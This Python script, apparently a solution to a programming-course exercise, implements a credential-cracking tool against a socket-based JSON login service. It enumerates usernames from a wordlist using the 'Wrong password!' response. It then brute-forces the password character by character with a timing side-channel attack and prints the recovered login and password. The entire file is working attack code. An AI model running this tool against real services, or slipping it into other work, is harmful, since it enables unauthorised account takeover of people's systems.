import os
import sys
import json
import time
import string
import socket


class PasswordHacker:
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = int(port)
        self.password = []
        self.login = None

    def open_connection(self):
        with socket.socket() as client_socket:
            address = (self.hostname, self.port)
            client_socket.connect(address)

            if self.login is None:
                login_list = self.login_generator()
                password = ""
                for login in login_list:
                    request = {"login": login, "password": password}
                    request = json.dumps(request)
                    data = bytes(request, encoding="utf-8")
                    client_socket.send(data)

                    response = client_socket.recv(1024)
                    response = response.decode("utf-8")
                    response = json.loads(response)
                    if response["result"] == "Wrong password!":
                        self.login = login
                        break

            _alpha_digit = string.ascii_lowercase + string.ascii_uppercase + string.digits
            while True:
                for element in _alpha_digit:
                    password = "".join(self.password) + element
                    request = {"login": login, "password": password}
                    request = json.dumps(request)
                    data = bytes(request, encoding="utf-8")
                    time_0 = time.time()
                    client_socket.send(data)

                    response = client_socket.recv(1024)
                    response = response.decode("utf-8")
                    response = json.loads(response)
                    time_1 = time.time()
                    time_delta = time_1 - time_0
                    if time_delta > 0.1:
                        self.password.append(element)
                        break
                    elif response["result"] == "Connection success!":
                        self.password.append(element)
                        break
                if response["result"] == "Connection success!":
                    print(request)
                    break

    @staticmethod
    def login_generator():
        file_path = os.getcwd() + "/hacking/logins.txt"
        with open(file_path, "r") as file:
            _logins = file.read().split("\n")
            return _logins


def main():
    args = sys.argv
    password_hacker = PasswordHacker(*args[1:])
    password_hacker.open_connection()


if __name__ == "__main__":
    main()
